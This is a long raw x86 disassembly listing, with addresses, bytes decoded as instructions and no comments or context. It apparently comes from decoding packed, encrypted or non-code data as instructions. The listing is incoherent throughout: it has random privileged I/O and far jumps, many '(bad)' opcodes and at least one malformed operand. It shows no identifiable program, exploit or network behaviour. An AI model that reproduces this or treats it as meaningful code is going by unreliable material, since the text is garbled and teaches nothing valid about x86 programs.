  40f250:	jnp    0x40f1f0
  40f252:	dec    ecx
  40f253:	xor    al,BYTE PTR [esi-0x4b066a02]
  40f259:	xchg   ebp,esi
  40f25b:	scas   eax,DWORD PTR es:[edi]
  40f25c:	jns    0x40f259
  40f25e:	dec    edx
  40f25f:	cmp    edx,DWORD PTR [esi]
  40f261:	sbb    ebx,esp
  40f263:	push   eax
  40f264:	int3   
  40f265:	shr    DWORD PTR [ecx],1
  40f267:	add    eax,DWORD PTR [eax+0x1967a2b3]
  40f26d:	xor    bl,al
  40f26f:	xchg   ecx,eax
  40f270:	xchg   BYTE PTR [ecx+0x96c313a],bl
  40f276:	xchg   edx,eax
  40f277:	fmul   st(0),st
  40f279:	fs jb  0x40f2cb
  40f27c:	ins    BYTE PTR es:[edi],dx
  40f27d:	mov    esp,0x7f42a279
  40f282:	call   0x18a5:0x40bacc38
  40f289:	xchg   ebx,eax
  40f28a:	mov    ebp,0xeb1a1b32
  40f28f:	xor    esp,DWORD PTR [ebx-0x4f]
  40f292:	xchg   edx,eax
  40f293:	out    dx,eax
  40f294:	fild   DWORD PTR [ecx-0x7b]
  40f297:	test   eax,0x3a10c9b1
  40f29c:	jl     0x40f246
  40f29e:	imul   ecx,DWORD PTR [esi+ecx*2-0x6c],0xffffffc4
  40f2a3:	cmp    BYTE PTR [eax+0x3be937be],ch
  40f2a9:	sti    
  40f2aa:	or     eax,0x8122cccd
  40f2af:	fwait
  40f2b0:	in     eax,0xc7
  40f2b2:	jmp    0x27d1:0xef556863
  40f2b9:	dec    ecx
  40f2ba:	imul   ecx,DWORD PTR [ebx-0x54cb5f25],0x50568a8a
  40f2c4:	pop    esi
  40f2c5:	add    ah,bl
  40f2c7:	mov    eax,0x96c95b11
  40f2cc:	fisub  DWORD PTR [esi-0x1b8d81f9]
  40f2d2:	jbe    0x40f2d5
  40f2d4:	mov    BYTE PTR [ebx-0x76a75c1d],cl
  40f2da:	dec    edi
  40f2db:	clc    
  40f2dc:	add    eax,0x5b0a0f42
  40f2e1:	daa    
  40f2e2:	and    DWORD PTR [ecx],esi
  40f2e4:	or     edx,ebp
  40f2e6:	stc    
  40f2e7:	push   ss
  40f2e8:	mov    ebp,0x83ce8683
  40f2ed:	stos   DWORD PTR es:[edi],eax
  40f2ee:	cwde   
  40f2ef:	push   ss
  40f2f0:	sahf   
  40f2f1:	stos   DWORD PTR es:[edi],eax
  40f2f2:	out    0xf0,al
  40f2f4:	cmp    bh,BYTE PTR [ebx-0x674778d2]
  40f2fa:	aaa    
  40f2fb:	std    
  40f2fc:	fmul   QWORD PTR [ebx+0xb7119ea]
  40f302:	loopne 0x40f2dd
  40f304:	mov    bl,0x30
  40f306:	loopne 0x40f368
  40f308:	push   ss
  40f309:	popf   
  40f30a:	aam    0x8
  40f30c:	or     al,0x99
  40f30e:	xchg   BYTE PTR [ebx],ah
  40f310:	jge    0x40f29d
  40f312:	out    dx,eax
  40f313:	mov    edi,0xc94ee589
  40f318:	test   BYTE PTR [bp+di-0x41],ch
  40f31c:	pop    es
  40f31d:	xlat   BYTE PTR ds:[ebx]
  40f31e:	or     dh,ah
  40f320:	mov    esi,0xaa0c0b87
  40f325:	pop    es
  40f326:	inc    esp
  40f327:	lahf   
  40f328:	sub    cl,BYTE PTR [ebp+ecx*1+0x17]
  40f32c:	aaa    
  40f32d:	in     al,dx
  40f32e:	out    dx,eax
  40f32f:	mov    WORD PTR [ebp+0x3a371218],fs
  40f335:	or     eax,DWORD PTR [esi-0x6002ab35]
  40f33b:	ret    
  40f33c:	or     eax,0x6d6f53a2
  40f341:	cmp    eax,0x5550190
  40f346:	pop    ds
  40f347:	aam    0xa5
  40f349:	and    DWORD PTR [ecx],eax
  40f34b:	dec    edx
  40f34c:	xchg   esi,eax
  40f34d:	addr16 push edx
  40f34f:	clc    
  40f350:	pop    ebx
  40f351:	mov    ebp,0xe15732a8
  40f356:	push   ecx
  40f357:	div    DWORD PTR ds:0x94fd2a8
  40f35d:	push   ebx
  40f35e:	mov    dh,0x1d
  40f360:	cwde   
  40f361:	enter  0xd74a,0x82
  40f365:	inc    edx
  40f366:	fisub  WORD PTR [edi]
  40f368:	cmp    eax,0xe9c85b3e
  40f36d:	int    0x65
  40f36f:	retf   
  40f370:	jmp    0xdeb2:0xab8011f4
  40f377:	pusha  
  40f378:	jmp    0x493a:0x9a2e3d08
  40f37f:	cdq    
  40f380:	push   0xcc32be3f
  40f385:	push   esp
  40f386:	push   es
  40f387:	cmp    BYTE PTR [edi+0x51c7dd1],ah
  40f38d:	xlat   BYTE PTR ds:[ebx]
  40f38e:	or     al,0x4e
  40f390:	add    esp,esi
  40f392:	sub    edi,DWORD PTR [esi-0x62]
  40f395:	lea    esi,[edx+edi*2]
  40f398:	inc    edi
  40f399:	add    al,BYTE PTR [edi]
  40f39b:	lods   al,BYTE PTR ds:[esi]
  40f39c:	sar    DWORD PTR [edi-0x37],cl
  40f39f:	in     al,0xa3
  40f3a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f3a2:	add    ebp,DWORD PTR [ebp+0x227a47b]
  40f3a8:	adc    DWORD PTR [edx+0xd9de751],esi
  40f3ae:	adc    dh,BYTE PTR [edx+0x59b6f89a]
  40f3b4:	mov    eax,0xd0eb1bfb
  40f3b9:	push   ecx
  40f3ba:	pop    esp
  40f3bb:	imul   esp,DWORD PTR [edx],0x5455c15d
  40f3c1:	imul   esi,DWORD PTR [ebx+0x64715c8d],0xffffffe6
  40f3c8:	clc    
  40f3c9:	leave  
  40f3ca:	mov    al,ds:0xf6c313ad
  40f3cf:	add    BYTE PTR [esi],al
  40f3d1:	jb     0x40f445
  40f3d3:	add    DWORD PTR ds:0xdb900b3b,ecx
  40f3d9:	imul   esi,DWORD PTR [ebx+0x1ebf4ed6],0xb5c07e60
  40f3e3:	xchg   edx,eax
  40f3e4:	xlat   BYTE PTR ds:[ebx]
  40f3e5:	jnp    0x40f3a9
  40f3e7:	dec    esp
  40f3e8:	nop
  40f3e9:	dec    esp
  40f3ea:	inc    esi
  40f3eb:	xor    DWORD PTR [edi+0x6a],esi
  40f3ee:	jae    0x40f446
  40f3f0:	cdq    
  40f3f1:	push   0xfffffff4
  40f3f3:	pop    edx
  40f3f4:	jno    0x40f3da
  40f3f6:	pop    edi
  40f3f7:	(bad)  
  40f3f8:	js     0x40f387
  40f3fa:	sbb    eax,0x1b4a7dbf
  40f3ff:	ins    DWORD PTR es:[edi],dx
  40f400:	mov    esi,0x513f19e2
  40f405:	ja     0x40f448
  40f407:	push   edx
  40f408:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f409:	cli    
  40f40a:	push   esp
  40f40b:	lock in eax,0x22
  40f40e:	sbb    edx,ebx
  40f410:	push   ds
  40f411:	and    ch,BYTE PTR [eax+0x4]
  40f414:	rol    BYTE PTR [edi-0x1d2ca85e],1
  40f41a:	jp     0x40f411
  40f41c:	jne    0x40f41c
  40f41e:	(bad)  
  40f41f:	int    0xc9
  40f421:	repz fwait
  40f423:	pusha  
  40f424:	test   BYTE PTR [ebp+0x4b],al
  40f427:	and    eax,0x136c857b
  40f42c:	shl    BYTE PTR [esi],1
  40f42e:	loopne 0x40f47f
  40f430:	popa   
  40f431:	imul   ebx,ecx,0xfffffff0
  40f434:	mov    ecx,0xe560e4c2
  40f439:	add    BYTE PTR ds:0x12f1c3cb,cl
  40f43f:	or     bh,BYTE PTR [ecx+0x58]
  40f442:	cmp    bh,BYTE PTR [ebx+esi*8-0x25]
  40f446:	add    al,0xd5
  40f448:	int    0x4a
  40f44a:	in     al,0x3d
  40f44c:	(bad)  
  40f44d:	shr    DWORD PTR [edi+0x429b52e3],1
  40f453:	icebp  
  40f454:	mov    ch,0x70
  40f456:	ins    DWORD PTR es:[edi],dx
  40f457:	push   cs
  40f458:	mov    ebp,0xf34aca58
  40f45d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f45e:	lock lea ebx,[eax+0x3c2f3910]
  40f465:	inc    edi
  40f466:	repz aam 0x58
  40f469:	jecxz  0x40f425
  40f46b:	sbb    edi,DWORD PTR [eax-0x39]
  40f46e:	mov    cl,0x30
  40f470:	pop    es
  40f471:	pop    ecx
  40f472:	pop    es
  40f473:	loopne 0x40f49f
  40f475:	jle    0x40f41f
  40f477:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f478:	out    dx,eax
  40f479:	popf   
  40f47a:	lods   eax,DWORD PTR ds:[esi]
  40f47b:	add    al,0x1c
  40f47d:	fs jmp 0x5223:0x9b64957c
  40f485:	cmp    BYTE PTR [esp+ebp*8+0x50],ah
  40f489:	lock hlt 
  40f48b:	mov    esp,0xe6df5d4d
  40f490:	jg     0x40f4d2
  40f492:	pop    ds
  40f493:	shl    esi,0xc3
  40f496:	sahf   
  40f497:	or     al,0x31
  40f499:	pop    eax
  40f49a:	ja     0x40f4fc
  40f49c:	sbb    eax,0x78c4464a
  40f4a1:	pushf  
  40f4a2:	int3   
  40f4a3:	gs push eax
  40f4a5:	test   edi,eax
  40f4a7:	rcl    BYTE PTR [edx-0x3743505c],cl
  40f4ad:	mov    eax,ds:0xa55f62eb
  40f4b2:	(bad)
  40f4b7:	popf   
  40f4b8:	pop    eax
  40f4b9:	inc    eax
  40f4ba:	mov    ebp,0x9e48fede
  40f4bf:	add    DWORD PTR [edi],ebp
  40f4c1:	push   es
  40f4c2:	push   0xffffffc9
  40f4c4:	cmp    al,0x30
  40f4c6:	lods   eax,DWORD PTR ds:[esi]
  40f4c7:	dec    ebx
  40f4c8:	stos   DWORD PTR es:[edi],eax
  40f4c9:	mov    edi,0xcf75e903
  40f4ce:	int3   
  40f4cf:	pop    eax
  40f4d0:	mov    ds:0xe16453b5,eax
  40f4d5:	cld    
  40f4d6:	(bad)  
  40f4d7:	stos   DWORD PTR es:[edi],eax
  40f4d8:	adc    eax,0xeadf4af1
  40f4dd:	fldcw  WORD PTR [edi]
  40f4df:	lods   eax,DWORD PTR ds:[esi]
  40f4e0:	out    dx,al
  40f4e1:	jl     0x40f51a
  40f4e3:	inc    esp
  40f4e4:	pop    ebp
  40f4e5:	mov    dh,0x6
  40f4e7:	mov    eax,0xe14d1de
  40f4ec:	xor    BYTE PTR [edi+0x47],dl
  40f4ef:	inc    esi
  40f4f0:	adc    ecx,eax
  40f4f2:	cmp    eax,0x1d9afb60
  40f4f7:	ret    0xbdee
  40f4fa:	sar    ah,0xda
  40f4fd:	sbb    dh,ch
  40f4ff:	mov    bl,0x3e
  40f501:	inc    ebx
  40f502:	or     dh,dl
  40f504:	clc    
  40f505:	push   cs
  40f506:	ins    DWORD PTR es:[edi],dx
  40f507:	jle    0x40f4a2
  40f509:	mov    WORD PTR [edi+edx*1+0x3d],es
  40f50d:	ins    BYTE PTR es:[di],dx
  40f50f:	std    
  40f510:	inc    ecx
  40f511:	mov    ch,0x49
  40f513:	ins    BYTE PTR es:[edi],dx
  40f514:	cmp    esi,ecx
  40f516:	popf   
  40f517:	and    DWORD PTR [edx+0x35147d22],esp
  40f51d:	call   0x9444:0x9b01d996
  40f524:	gs sub eax,0x2ddb084
  40f52a:	inc    ecx
  40f52b:	fsubr  DWORD PTR [edi+0x137d5c7a]
  40f531:	sbb    DWORD PTR [esi+0x16],0x2c
  40f535:	jmp    0x40f4e9
  40f537:	push   ecx
  40f538:	sub    al,0x3c
  40f53a:	dec    esi
  40f53b:	xchg   esp,eax
  40f53c:	js     0x40f5a6
  40f53e:	inc    ecx
  40f53f:	fstp   QWORD PTR [eax+ebp*8+0x66]
  40f543:	add    esp,DWORD PTR [ecx+esi*4+0xd3f96d]
  40f54a:	hlt    
  40f54b:	xlat   BYTE PTR ds:[ebx]
  40f54c:	cmp    eax,0x748cebac
  40f551:	push   es
  40f552:	adc    al,0xa6
  40f554:	sub    bh,BYTE PTR [edi+0x78]
  40f557:	int3   
  40f558:	jb     0x40f4f3
  40f55a:	inc    DWORD PTR [ebx+0x26]
  40f55d:	xchg   esi,eax
  40f55e:	xchg   esi,eax
  40f55f:	adc    edi,DWORD PTR [edx+0x1117a95c]
  40f565:	xchg   BYTE PTR [edx],cl
  40f567:	lods   al,BYTE PTR ds:[esi]
  40f568:	xchg   bl,bh
  40f56a:	xor    DWORD PTR [ebx+0x650bc508],edi
  40f570:	push   edi
  40f571:	cmc    
  40f572:	cmc    
  40f573:	mov    ds:0xcb51b3aa,eax
  40f578:	scas   eax,DWORD PTR es:[edi]
  40f579:	jmp    0x948a51e3
  40f57e:	pop    es
  40f57f:	gs bound esi,QWORD PTR fs:[esi]
  40f583:	jne    0x40f53a
  40f585:	add    dh,BYTE PTR [ecx+0x64]
  40f588:	repz sar eax,cl
  40f58b:	fadd   DWORD PTR [edi-0x71]
  40f58e:	idiv   DWORD PTR [ebp+0x21]
  40f591:	(bad)  
  40f592:	jmp    0x73b1:0x9c64b72f
  40f599:	pop    ss
  40f59a:	repz mov bh,ah
  40f59d:	xor    DWORD PTR [ebx+ecx*8+0x223bde12],esp
  40f5a4:	add    al,0xd4
  40f5a6:	in     eax,dx
  40f5a7:	mov    esp,0xdbd5c6dc
  40f5ac:	sti    
  40f5ad:	push   cs
  40f5ae:	push   0xa412fd42
  40f5b3:	imul   esp,edi,0x27
  40f5b6:	mov    edi,0x9eaad4c
  40f5bb:	test   eax,0x9fdd7a9d
  40f5c0:	pushf  
  40f5c1:	cmp    al,0x3
  40f5c4:	sbb    dl,ah
  40f5c6:	arpl   si,bp
  40f5c8:	mov    ?,WORD PTR [edi]
  40f5ca:	sub    DWORD PTR [edx+0x62043af5],0x5a31fbf9
  40f5d4:	or     ecx,DWORD PTR [edi+0x59e3b85d]
  40f5da:	test   al,0xbb
  40f5dc:	call   0x10d51fac
  40f5e1:	inc    ecx
  40f5e2:	mov    dh,0xb7
  40f5e4:	xchg   edx,eax
  40f5e5:	popa   
  40f5e6:	sti    
  40f5e7:	(bad)
  40f5eb:	inc    edi
  40f5ec:	inc    edi
  40f5ed:	mov    al,ds:0x689df78d
  40f5f2:	jecxz  0x40f5af
  40f5f4:	dec    esi
  40f5f5:	aam    0xf6
  40f5f7:	(bad)  
  40f5f9:	sub    eax,0x57a4c62e
  40f5fe:	adc    ah,BYTE PTR [edi-0x36]
  40f601:	fsubp  st(7),st
  40f603:	pop    eax
  40f604:	int    0xa
  40f606:	pop    es
  40f607:	pop    ds
  40f608:	aam    0x6a
  40f60a:	aaa    
  40f60b:	dec    esp
  40f60c:	sti    
  40f60d:	sbb    eax,0xb5eee984
  40f612:	fadd   QWORD PTR [edx]
  40f614:	fidiv  WORD PTR [ebp+0x12]
  40f617:	push   ebp
  40f618:	lods   eax,DWORD PTR ds:[esi]
  40f619:	aaa    
  40f61a:	in     al,dx
  40f61b:	inc    ebx
  40f61c:	ja     0x40f60b
  40f61e:	sbb    al,0xad
  40f620:	cdq    
  40f621:	sbb    ebx,DWORD PTR [ecx+ebx*4-0x448668ab]
  40f628:	or     al,0x88
  40f62a:	mov    ch,0x32
  40f62c:	rol    cl,cl
  40f62e:	(bad)  
  40f62f:	in     eax,0x2d
  40f631:	ficomp DWORD PTR [edx-0x62]
  40f634:	adc    DWORD PTR [esi],0x6287b51c
  40f63a:	iret   
  40f63b:	lahf   
  40f63c:	(bad)  
  40f63d:	dec    esp
  40f63e:	aam    0xfc
  40f640:	mov    esi,0xe4f33ce2
  40f645:	adc    al,0x33
  40f647:	mov    bh,cl
  40f649:	mov    ebx,0x30a029db
  40f64e:	cmp    eax,0xc314f679
  40f653:	pop    ecx
  40f654:	call   0x9a88:0x3aa58b4f
  40f65b:	mov    ebp,0xb4cbba5a
  40f660:	jmp    0x40f65c
  40f662:	sub    al,0x9d
  40f664:	xlat   BYTE PTR ds:[ebx]
  40f665:	or     al,0xe9
  40f667:	into   
  40f668:	out    dx,al
  40f669:	out    dx,al
  40f66a:	ss push esi
  40f66c:	std    
  40f66d:	rcl    BYTE PTR [ebx-0x41b2faf7],0xc9
  40f674:	pop    es
  40f675:	stos   BYTE PTR es:[edi],al
  40f676:	pop    ecx
  40f677:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f678:	loopne 0x40f658
  40f67a:	mov    bl,0x56
  40f67c:	ins    BYTE PTR es:[edi],dx
  40f67d:	call   0x9346:0x2641dc3
  40f684:	out    dx,eax
  40f685:	(bad)  
  40f686:	ficomp WORD PTR [ecx]
  40f688:	mov    BYTE PTR [ebx-0x20],bl
  40f68b:	sub    BYTE PTR [edi+ebx*4],bl
  40f68e:	push   0x5bf3284d
  40f693:	lds    ecx,FWORD PTR ds:0xb68f465c
  40f699:	push   0x23
  40f69b:	sbb    DWORD PTR ds:0x1bf3dcfe,eax
  40f6a1:	push   cs
  40f6a2:	loopne 0x40f676
  40f6a4:	sahf   
  40f6a5:	mov    eax,DWORD PTR [edx-0x63a723db]
  40f6ab:	and    eax,0x692a88aa
  40f6b0:	push   edx
  40f6b1:	inc    ebp
  40f6b2:	cmp    al,0x8c
  40f6b4:	nop
  40f6b5:	fucomi st,st(4)
  40f6b7:	(bad)  
  40f6b9:	aad    0xbc
  40f6bb:	mov    ds:0x1662aa0c,al
  40f6c0:	popa   
  40f6c1:	push   ds
  40f6c2:	stos   BYTE PTR es:[edi],al
  40f6c3:	push   0x2d454c77
  40f6c8:	mov    bl,0x44
  40f6ca:	push   ds
  40f6cb:	inc    edx
  40f6cc:	sbb    ebx,ebx
  40f6ce:	out    0xcd,al
  40f6d0:	test   al,0xec
  40f6d2:	jne    0x40f72f
  40f6d4:	pop    eax
  40f6d5:	jae    0x40f6aa
  40f6d7:	jbe    0x40f74b
  40f6d9:	sbb    al,0x72
  40f6dc:	loopne 0x40f6af
  40f6de:	xchg   ebp,eax
  40f6df:	call   ebx
  40f6e1:	dec    ebx
  40f6e2:	enter  0xfbc6,0xcd
  40f6e6:	clc    
  40f6e7:	stos   BYTE PTR es:[edi],al
  40f6e8:	imul   esp,DWORD PTR [eax],0x35
  40f6eb:	int    0xf1
  40f6ed:	mov    al,0x37
  40f6ef:	xchg   BYTE PTR [edi-0x68],dh
  40f6f2:	push   ebx
  40f6f3:	push   ebx
  40f6f4:	out    0x86,eax
  40f6f6:	pushf  
  40f6f7:	sbb    eax,0x95dca336
  40f6fc:	adc    BYTE PTR [edi-0x455f1dcd],al
  40f702:	and    BYTE PTR gs:[eax-0x14],ah
  40f706:	add    eax,0x317a90c4
  40f70b:	or     dh,BYTE PTR [edx+ebp*2]
  40f70e:	adc    BYTE PTR [edi-0x55],dl
  40f711:	loope  0x40f763
  40f713:	push   ds
  40f714:	in     al,dx
  40f715:	mov    dh,0x6a
  40f717:	inc    BYTE PTR [esi+0x48ebb1e]
  40f71d:	es pop ss
  40f71f:	push   eax
  40f720:	add    al,0xa6
  40f722:	mov    edx,0x86fb0ee1
  40f727:	sub    bl,ah
  40f729:	cmp    BYTE PTR [esi],0x9d
  40f72c:	repnz sub eax,0xcd1bf463
  40f732:	mov    edi,0xcb6e17b7
  40f737:	es ja  0x40f71c
  40f73a:	mov    esi,0x41c390b5
  40f73f:	out    0x4e,eax
  40f741:	rcl    edx,0xea
  40f744:	jbe    0x40f78c
  40f746:	repz ret 0x5acf
  40f74a:	shl    BYTE PTR [edi+0x349e26ad],1
  40f750:	lock mov bh,0x9c
  40f753:	adc    DWORD PTR [ecx+0x35d77431],edi
  40f759:	(bad)  
  40f75a:	fucom  st(7)
  40f75c:	pusha  
  40f75d:	outs   dx,DWORD PTR ds:[esi]
  40f75e:	xor    al,0x51
  40f760:	aaa    
  40f761:	pop    esi
  40f762:	push   es
  40f763:	push   esi
  40f764:	cmp    eax,0xdf5e9971
  40f769:	outs   dx,DWORD PTR ds:[esi]
  40f76a:	test   eax,0x5510f121
  40f76f:	ret    0x8f71
  40f772:	add    cl,BYTE PTR [eax+0x15834229]
  40f778:	mov    bl,0xdc
  40f77a:	outs   dx,DWORD PTR ds:[esi]
  40f77b:	dec    edx
  40f77c:	inc    ebx
  40f77d:	and    dh,BYTE PTR [esi]
  40f77f:	retf   0x118f
  40f782:	xchg   edi,eax
  40f783:	lock fucom st(3)
  40f786:	pushf  
  40f787:	dec    ebp
  40f788:	add    bh,cl
  40f78a:	push   edi
  40f78b:	ins    BYTE PTR es:[edi],dx
  40f78c:	and    al,0x74
  40f78e:	jbe    0x40f7ce
  40f790:	pop    esp
  40f791:	mov    cl,0x5b
  40f793:	xchg   esi,eax
  40f794:	jb     0x40f7ca
  40f796:	xor    al,0xd
  40f798:	jl     0x40f7a8
  40f79a:	mov    al,ds:0xf0876671
  40f79f:	xchg   esp,eax
  40f7a0:	jae    0x40f726
  40f7a2:	std    
  40f7a3:	or     cl,dh
  40f7a5:	add    eax,ebx
  40f7a7:	xchg   ebx,eax
  40f7a8:	dec    edx
  40f7a9:	mov    al,0xb2
  40f7ab:	mov    bh,BYTE PTR [esi]
  40f7ad:	(bad)  [ecx+esi*8]
  40f7b0:	inc    eax
  40f7b1:	fiadd  DWORD PTR [ebx]
  40f7b3:	in     eax,dx
  40f7b4:	jne    0x40f834
  40f7b6:	mov    BYTE PTR [esi-0x5c4684b9],0xd
  40f7bd:	push   cs
  40f7be:	aad    0x20
  40f7c0:	adc    al,0x7e
  40f7c2:	call   ecx
  40f7c4:	das    
  40f7c5:	retf   
  40f7c6:	imul   ebp,DWORD PTR [ecx+ecx*1+0x4b],0xd7c80248
  40f7ce:	xor    eax,0x98fa85bc
  40f7d3:	add    DWORD PTR ds:0x91ee55e5,0xffffffb2
  40f7da:	fbstp  TBYTE PTR [edi+0x10]
  40f7dd:	jb     0x40f78f
  40f7df:	mov    edi,0xb37aa2f6
  40f7e4:	out    dx,al
  40f7e5:	sbb    edi,DWORD PTR [ebx-0x3e]
  40f7e8:	xchg   al,bl
  40f7ea:	lods   al,BYTE PTR ds:[esi]
  40f7eb:	arpl   bp,si
  40f7ed:	popf   
  40f7ee:	jl     0x40f7b8
  40f7f0:	and    eax,0x113aaf50
  40f7f5:	jl     0x40f7ef
  40f7f7:	mov    esp,ds
  40f7f9:	cmp    cl,al
  40f7fb:	inc    edx
  40f7fc:	mov    eax,0x608a5f5
  40f801:	(bad)  
  40f802:	sti    
  40f803:	popf   
  40f804:	sbb    ah,BYTE PTR [esi-0x709edfa]
  40f80a:	add    BYTE PTR [ebx-0x21],ch
  40f80d:	popa   
  40f80e:	ret    0xd24
  40f811:	jbe    0x40f887
  40f813:	jecxz  0x40f824
  40f815:	mov    esi,0x3e9b93f0
  40f81a:	dec    esp
  40f81b:	das    
  40f81c:	repz inc ecx
  40f81e:	pop    ebp
  40f81f:	(bad)  
  40f821:	jbe    0x40f805
  40f823:	(bad)  
  40f824:	in     al,dx
  40f825:	add    ebp,DWORD PTR [esi+0x30]
  40f828:	or     eax,0xf8b8d2cf
  40f82d:	test   eax,0xf19ef83b
  40f832:	xchg   edx,eax
  40f833:	jno    0x40f7bd
  40f835:	pop    ecx
  40f836:	retf   
  40f837:	sbb    al,0xcb
  40f839:	or     esi,edi
  40f83b:	adc    al,0x9
  40f83d:	pop    es
  40f83e:	test   BYTE PTR [edi+0x36],0x30
  40f842:	jnp    0x40f82a
  40f844:	cmp    cl,al
  40f846:	cmp    ecx,DWORD PTR [ebx-0x3d]
  40f849:	pause  
  40f84b:	(bad)  
  40f84d:	adc    BYTE PTR [edx+edi*4+0x11],0x4c
  40f852:	je     0x40f81f
  40f854:	add    BYTE PTR ds:0x445f49ee,ah
  40f85a:	adc    dl,BYTE PTR [ecx+0x4c490769]
  40f860:	lds    ecx,FWORD PTR [esi]
  40f862:	push   eax
  40f863:	mov    al,0x28
  40f865:	jmp    0x2338cf8c
  40f86a:	mov    WORD PTR [ecx],gs
  40f86c:	cwde   
  40f86d:	nop
  40f86e:	xchg   esp,eax
  40f86f:	je     0x40f881
  40f871:	and    ah,al
  40f873:	fwait
  40f874:	mov    ebx,0x3ab672d6
  40f879:	bound  edi,QWORD PTR cs:[eax+0x46]
  40f87d:	mov    esi,0xa200a970
  40f882:	cli    
  40f883:	jbe    0x40f815
  40f885:	ins    DWORD PTR es:[edi],dx
  40f886:	add    al,0xe9
  40f888:	in     al,0xa2
  40f88a:	xchg   edx,eax
  40f88b:	enter  0x783c,0x6f
  40f88f:	inc    ecx
  40f890:	cmp    eax,0x3152105f
  40f895:	inc    edx
  40f896:	mov    ss,eax
  40f898:	xor    bh,BYTE PTR [ecx-0x6d1614f]
  40f89e:	ret    0x4ffd
  40f8a1:	xchg   ebp,eax
  40f8a2:	outs   dx,BYTE PTR ds:[esi]
  40f8a3:	or     BYTE PTR [esi-0x17],0x65
  40f8a7:	cwde   
  40f8a8:	and    dh,BYTE PTR [ecx]
  40f8aa:	adc    DWORD PTR [edi],0xd09b7bb8
  40f8b0:	dec    edi
  40f8b1:	mov    bl,BYTE PTR [esi]
  40f8b3:	stos   BYTE PTR es:[edi],al
  40f8b4:	aad    0xdb
  40f8b6:	inc    esi
  40f8b7:	jmp    0x40f84f
  40f8b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f8ba:	jb     0x40f8e9
  40f8bc:	aas    
  40f8bd:	inc    edx
  40f8be:	retf   
  40f8bf:	mov    esp,0xbea6781f
  40f8c4:	push   esp
  40f8c5:	sar    BYTE PTR [ebx+0x6e4a0a27],1
  40f8cb:	retf   
  40f8cc:	push   es
  40f8cd:	repz shl BYTE PTR [eax+0x7a],0x59
  40f8d2:	mov    edx,0x44272605
  40f8d7:	(bad)  
  40f8d8:	or     esi,0xffffffeb
  40f8db:	sub    eax,0xad9dfd5a
  40f8e0:	inc    ecx
  40f8e1:	xlat   BYTE PTR ds:[ebx]
  40f8e2:	jl     0x40f883
  40f8e4:	sub    BYTE PTR [edi],bl
  40f8e6:	pop    esi
  40f8e7:	pop    ds
  40f8e8:	fldenv [ebx]
  40f8ea:	dec    ebx
  40f8eb:	aaa    
  40f8ec:	popf   
  40f8ed:	jecxz  0x40f963
  40f8ef:	cmp    bl,BYTE PTR [ebx+0x153a5c54]
  40f8f5:	stos   BYTE PTR es:[edi],al
  40f8f6:	xchg   edi,eax
  40f8f7:	sub    al,0xd1
  40f8f9:	sbb    ebp,DWORD PTR [ebp+edi*2-0x37a3829f]
  40f900:	mov    ebp,0xd97067d4
  40f905:	lods   al,BYTE PTR ds:[esi]
  40f906:	jns    0x40f96a
  40f908:	shr    bl,0xe5
  40f90b:	cwde   
  40f90c:	dec    BYTE PTR [esi]
  40f90e:	sub    dl,BYTE PTR [eax]
  40f910:	retf   
  40f911:	mov    ds:0x9ce9dd10,al
  40f916:	and    bh,BYTE PTR [edx-0x432899bf]
  40f91c:	ins    DWORD PTR es:[edi],dx
  40f91d:	imul   edx,DWORD PTR [esi+0x43760aa3],0x59
  40f924:	and    eax,0x190aee94
  40f929:	shl    edi,cl
  40f92b:	add    esp,DWORD PTR [eax]
  40f92d:	jae    0x40f8f9
  40f92f:	lods   eax,DWORD PTR ds:[esi]
  40f930:	adc    edx,ecx
  40f932:	xchg   ebx,eax
  40f933:	push   ecx
  40f934:	sbb    ah,BYTE PTR [ebx-0x7f]
  40f937:	stos   DWORD PTR es:[edi],eax
  40f938:	aas    
  40f939:	mov    esi,0x9833b5c2
  40f93e:	xor    BYTE PTR [ebp+0x11],0x16
  40f942:	mov    ds:0xf9c56168,eax
  40f947:	ror    DWORD PTR [ebp+0x51],cl
  40f94a:	mov    esi,0x375eba32
  40f94f:	xchg   esp,eax
  40f950:	jnp    0x40f909
  40f952:	mov    ds:0xf4f270dd,al
  40f957:	push   ss
  40f958:	imul   ecx,DWORD PTR [ecx+0x6546f7],0x6189cc33
  40f962:	push   ebx
  40f963:	loope  0x40f91d
  40f965:	mov    ah,BYTE PTR ds:[edx]
  40f968:	rcl    ecx,1
  40f96a:	sub    eax,0x1e862748
  40f96f:	add    eax,0x1d37c78b
  40f974:	mov    ebp,0xffa27fc3
  40f979:	dec    ebp
  40f97a:	push   cs
  40f97b:	int    0x74
  40f97d:	and    edx,esi
  40f97f:	in     al,dx
  40f980:	xchg   edx,eax
  40f981:	xor    ebx,DWORD PTR [ebx-0x28]
  40f984:	das    
  40f985:	lock sbb BYTE PTR [ebp+0x8548a18],0x68
  40f98d:	lahf   
  40f98e:	in     al,dx
  40f98f:	div    DWORD PTR [edi-0x1b]
  40f992:	and    edi,DWORD PTR [edi+edi*4-0x49]
  40f996:	adc    bh,BYTE PTR [ebp-0x13dc1603]
  40f99c:	in     eax,dx
  40f99d:	mov    esi,0x2f8955c3
  40f9a2:	fistp  DWORD PTR [esi]
  40f9a4:	test   BYTE PTR [ecx+0x59f739fb],dl
  40f9aa:	xchg   BYTE PTR ds:0x84ed2792,al
  40f9b0:	adc    DWORD PTR [ecx-0x4d789e88],esp
  40f9b6:	mov    WORD PTR [edi+edx*1+0x7f],ds
  40f9ba:	mov    ah,0x4b
  40f9bc:	scas   eax,DWORD PTR es:[edi]
  40f9bd:	mov    al,ds:0xf81153b
  40f9c2:	(bad)  [edi+0x60]
  40f9c5:	jns    0x40f965
  40f9c7:	jns    0x40f9f7
  40f9c9:	fwait
  40f9ca:	adc    edi,DWORD PTR [ecx]
  40f9cc:	rcl    BYTE PTR [ebp-0x4709162],1
  40f9d2:	(bad)  
  40f9d3:	xor    DWORD PTR [ebx+0x44211648],esi
  40f9d9:	mov    edi,0xca9ab94a
  40f9de:	push   ecx
  40f9df:	adc    DWORD PTR [ebx],edx
  40f9e1:	ins    BYTE PTR es:[edi],dx
  40f9e2:	push   esp
  40f9e3:	ins    DWORD PTR es:[edi],dx
  40f9e4:	(bad)  
  40f9e6:	push   0xaf1d9c15
  40f9eb:	iret   
  40f9ec:	pop    ebp
  40f9ed:	mov    eax,0x9339b7e8
